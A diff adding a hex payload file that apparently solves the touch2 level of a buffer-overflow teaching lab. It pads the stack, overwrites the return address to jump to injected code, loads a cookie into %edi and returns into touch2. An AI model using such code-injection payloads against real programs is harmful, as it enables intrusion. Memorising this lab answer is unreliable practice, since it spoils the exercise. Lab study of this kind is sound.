@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+a8 dc 61 55 00 00 00 00 	/* return address. jump to injected code on stack */
+bf fa 97 b9 59 				/* movl $cookie, %edi */
+68 ec 17 40 00				/* push touch2's address */
+c3							/* ret */
